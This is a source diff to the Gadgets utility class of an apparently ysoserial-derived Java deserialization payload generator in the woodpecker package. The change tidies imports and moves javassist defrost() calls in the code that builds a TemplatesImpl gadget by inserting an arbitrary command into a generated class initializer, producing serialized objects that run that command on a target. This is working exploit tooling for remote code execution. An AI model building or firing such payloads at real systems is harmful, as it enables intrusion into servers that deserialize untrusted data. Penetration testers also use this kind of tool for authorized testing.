@@ -3,20 +3,14 @@ package me.gv7.woodpecker.yso.payloads.util;
 
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 
-import java.io.Serializable;
 import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
 
 import javassist.*;
-
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import me.gv7.woodpecker.yso.GeneratePayload;
 import me.gv7.woodpecker.yso.payloads.custom.CustomCommand;
 import me.gv7.woodpecker.yso.payloads.custom.TemplatesImplUtil;
@@ -105,6 +99,7 @@ public class Gadgets {
             String cmd = TemplatesImplUtil.getCmd(command);
             //final CtClass clazz = pool.get(StubTransletPayload.class.getName());
             final CtClass clazz = pool.makeClass(tmplClazzName);
+            clazz.defrost();
             clazz.makeClassInitializer().insertAfter(cmd);
             // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
             CtClass superC = pool.get(abstTranslet.getName());
@@ -117,6 +112,7 @@ public class Gadgets {
 
         // inject class bytes into instance
         final CtClass foo = pool.makeClass("Foo");
+        foo.defrost();
         CtClass clsSerializable = pool.get("java.io.Serializable");
         foo.setInterfaces(new CtClass[]{clsSerializable});
         foo.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", foo));
@@ -129,8 +125,8 @@ public class Gadgets {
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
 
         // 解决: java.lang.RuntimeException: StubTransletPayload: frozen class (cannot edit) 错误
-        pool.getCtClass(tmplClazzName).defrost();
-        pool.getCtClass("Foo").defrost();
+        //pool.getCtClass(tmplClazzName).defrost();
+        //pool.getCtClass("Foo").defrost();
         return templates;
     }
 
